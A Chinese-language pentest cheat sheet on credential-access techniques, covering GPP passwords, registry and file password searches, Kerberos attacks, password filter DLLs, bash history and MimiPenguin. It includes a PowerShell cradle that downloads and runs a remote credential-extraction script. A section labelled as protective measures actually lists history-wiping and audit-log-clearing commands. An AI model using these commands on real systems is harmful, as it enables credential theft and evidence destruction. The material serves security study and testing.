### 组策略首选项（GPP）文件

组策略首选项（GPP）是一种工具，允许管理员使用嵌入式凭据创建域策略，并设置本地账户。这些策略存储在域控制器上的SYSVOL共享中，这意味着任何域用户都可以查看SYSVOL并解密密码。

**参考链接：**
- [MSRC Blog: MS14-025 - An Update for Group Policy Preferences](https://msrc-blog.microsoft.com/2014/05/13/ms14-025-an-update-for-group-policy-preferences/)

**获取GPP密码的方法：**

1. 使用PowerShell脚本：
   ```powershell
   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1'); Get-GPPPassword
   ```

2. 手动导入 `Get-GPPPassword.ps1` 脚本：
   ```powershell
   Import-Module .\Get-GPPPassword.ps1
   Get-GPPPassword
   ```

### 文件中的凭据

攻击者可以在本地文件系统和远程文件共享中搜索包含密码的文件。这些文件可能包括用户自建的凭据存储文件、配置文件或二进制文件。

**查找系统内所有含 "password" 的文件：**
```cmd
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
```

**从Windows域控制器上的组策略首选项获取密码：**
- 参考：[Pentest Lab: Stored Credentials](https://pentestlab.blog/2017/04/19/stored-credentials/)

### 注册表中的凭据

Windows注册表存储了可供系统或其他程序使用的配置信息。攻击者可以通过查询注册表来获取已储存的凭据和密码。

**命令如下：**
- 获取所有用户的凭据：
  ```cmd
  reg query HKLM /f password /t REG_SZ /s
  ```
- 获取当前用户的凭据：
  ```cmd
  reg query HKCU /f password /t REG_SZ /s
  ```

### 键盘记录

攻击者可以通过键盘记录来获取用户的有效凭据。

### Kerberos 漏洞利用

当攻击者可以利用程序、服务、系统软件或内核中的编程错误时，他们可以利用身份验证和验证机制进行攻击，以获取有用凭据的访问权限或绕过流程获取系统访问权。例如，MS14-068漏洞允许域用户伪造Kerberos票据。

**参考链接：**
- [AD Security: MS14-068 Forged PAC Exploit](https://adsecurity.org/?p=541)
- [AD Security: MS14-068 Forged PAC Exploit (Detailed)](https://adsecurity.org/?p=525)
- [AD Security: MS14-068 Forged PAC Exploit (Exploitation)](https://adsecurity.org/?p=1515)

### Kerberoast

服务主体名称（SPN）是Kerberos客户端唯一标识给定Kerberos目标计算机的服务实例的名称。以下是最受欢迎的AD Kerberos攻击：

- **SPN扫描**：通过请求特定SPN类/类型的服务主体名称来查找服务。
- **Silver Ticket**：伪造Kerberos TGS服务票。
- **Golden Ticket**：伪造Kerberos TGT认证票。
- **MS14-068 Forged PAC Exploit**：利用域控制器上的Kerberos漏洞。
- **钻石PAC**：混合攻击类型，使用Golden Ticket和MS14-068伪造PAC的元素。
- **Skeleton Key**：内存中的恶意软件，修补域控制器内存中的LSASS身份验证过程，以启用第二个有效的“框架密钥”密码，可用于对任何域帐户进行身份验证。

**参考链接：**
- [AD Security: Skeleton Key Malware](https://adsecurity.org/?p=2293)

**SPN扫描示例：**
- [GitHub: PowerShell-AD-Recon](https://github.com/PyroTek3/PowerShell-AD-Recon)

### 嗅探

网络嗅探是指通过使用系统上的网络接口来获取有线或无线发送的信息。攻击者将网络接口置于混杂模式，被动地访问传输中的数据，或者跨接端口来获取数据。通过该技术，攻击者可以获取用户的凭据，尤其是未加密的通讯协议发送的凭据。

**工具示例：**
- Wireshark

### 密码过滤

Windows密码过滤器是实施域和本地账户密码策略的机制。过滤器实现为动态链接库（DLL），其中包含了根据密码策略验证潜在密码的方法。在发送密码更改请求时，LSA会调用系统上注册的密码筛选器。

**步骤：**
1. 将DLL复制到域控制器或本地计算机的Windows安装目录（默认位置为`C:\Windows\System32`）。
2. 更新注册表：
   - 如果存在`Notification Packages`子项，请将DLL的名称添加到现有值数据中。
   - 如果`Notification Packages`子项不存在，请添加它，然后为值数据指定DLL的名称。
   - 不要包含`.dll`扩展名。

**参考链接：**
- [GitHub: Password-Filter-DLL in Penetration Testing](https://3gstudent.github.io/3gstudent.github.io/Password-Filter-DLL%E5%9C%A8%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/)

### Linux

#### Bash History

Bash使用`history`实用程序跟踪用户在命令行上键入的命令。用户注销后，历史记录会刷新到用户的`.bash_history`文件中。攻击者可以通过查看此文件来获取潜在凭据。

**环境介绍：**
- 目标靶机：CentOS
- IP地址：192.168.18.138

**命令示例：**
```bash
history
cat ~/.bash_history
cat ~/.bash_history | grep password > bash.txt
```

**防护措施：**
1. 在命令前插入空格：`export HISTCONTROL=ignorespace`
2. 禁用当前会话的所有历史记录：`export HISTSIZE=0; history -cw`
3. 关闭历史记录：`set +o history`
4. 从历史记录中删除指定的命令：`history -d [num]`
5. 删除全部历史命令：`rm ~/.bash_history; echo "" > .bash_history; cat /dev/null > ~/.bash_history`
6. 清除记录历史文件位置的变量：`unset HISTFILE`

**清除audit日志：**
```bash
cat /dev/null > /var/log/audit/audit.log
```

#### 密码转储

Linux上的`/proc`文件系统包含了有关正在运行的操作系统的大量信息。以root权限运行的进程可以使用这些信息来获取其他正在运行的程序和实时内存。

**工具示例：**
- MimiPenguin：一个免费、开源、简单的shell/python脚本，用于从当前Linux桌面用户转储登录凭证（用户名和密码）。

**环境介绍：**
- 目标靶机：Ubuntu 18.04.2 LTS
- gnome-keyring: 3.28.0.2

**支持的目标：**
- Ubuntu Desktop 12.04 LTS x64: gnome-keyring-daemon ✔ (3.18.3)

**参考链接：**
- [Linux中国: MimiPenguin](https://linux.cn/article-8581-1.html)